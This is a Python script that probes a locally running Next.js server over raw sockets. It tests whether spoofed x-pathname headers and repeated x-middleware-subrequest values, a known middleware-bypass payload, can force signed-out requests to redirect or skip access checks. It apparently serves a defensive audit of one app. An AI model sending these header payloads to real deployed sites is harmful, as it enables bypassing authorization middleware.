"""Raw-socket probe of the x-pathname overwrite on a running `next start`.

Usage: python3 -I probe.py <port> <label>
Prints one TSV row per request: label, method, target, headers sent, status, location, redirected.
Oracle (fixed before the run): a signed-out request is "redirected" when the status is 3xx with a
Location ending /message/m/0/edit, or the body carries NEXT_REDIRECT naming /message/m/0/edit.
No cookies are sent, so every request is signed out.
"""
import socket
import sys

PORT = int(sys.argv[1])
LABEL = sys.argv[2]

TARGETS = [
    '/message', '/message/', '/message/m/new', '/message/m/1/edit', '/message/m/1/edit/', '/message/m/1/send',
    '/message/f/1', '/message/m/0/edit', '/message/m/0/send', '/message//m/1/edit', '/message/%6d/1/edit',
    '/message/m/0/edit/../../1/edit', '/message/m/1/edit?x=/message/m/0/edit', '/MESSAGE/m/1/edit',
    '/message/m/1/edit.rsc', '/preview', '/api/guilds/1/x', '/api/v1/guilds/1/messages',
]
SPOOFS = [
    [],
    [('x-pathname', '/message/m/0/edit')],
    [('X-PATHNAME', '/message/m/0/edit')],
    [('x-pathname', '/message/m/0/edit'), ('x-pathname', '/message/m/0/send')],
    [('x-pathname', '/message/m/0/edit'), ('RSC', '1')],
    [('x-middleware-subrequest', 'middleware:middleware:middleware:middleware:middleware'), ('x-pathname', '/message/m/0/edit')],
    [('x-middleware-subrequest', 'src/proxy:src/proxy:src/proxy:src/proxy:src/proxy'), ('x-pathname', '/message/m/0/edit')],
    [('x-middleware-subrequest', 'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'), ('x-pathname', '/message/m/0/edit')],
]
METHODS = ['GET', 'HEAD']


def send(method, target, extra):
    lines = [f'{method} {target} HTTP/1.1', f'Host: localhost:{PORT}', 'Connection: close']
    lines += [f'{k}: {v}' for k, v in extra]
    raw = ('\r\n'.join(lines) + '\r\n\r\n').encode()
    with socket.create_connection(('127.0.0.1', PORT), timeout=60) as s:
        s.sendall(raw)
        chunks = []
        while True:
            b = s.recv(65536)
            if not b:
                break
            chunks.append(b)
    data = b''.join(chunks)
    head, _, body = data.partition(b'\r\n\r\n')
    head_lines = head.decode('latin-1').split('\r\n')
    status = head_lines[0].split(' ')[1] if head_lines and ' ' in head_lines[0] else '?'
    location = ''
    for h in head_lines[1:]:
        if h.lower().startswith('location:'):
            location = h.split(':', 1)[1].strip()
    text = body.decode('utf-8', 'replace')
    redirected = (status.startswith('3') and location.endswith('/message/m/0/edit')) or (
        'NEXT_REDIRECT' in text and '/message/m/0/edit' in text)
    return status, location, redirected


for method in METHODS:
    for target in TARGETS:
        for spoof in SPOOFS:
            sent = ';'.join(f'{k}={v}' for k, v in spoof) or '-'
            try:
                status, location, redirected = send(method, target, spoof)
            except Exception as exc:  # noqa: BLE001
                status, location, redirected = f'ERR {type(exc).__name__}', '', False
            print('\t'.join([LABEL, method, target, sent, status, location or '-', 'REDIRECT' if redirected else 'no']), flush=True)
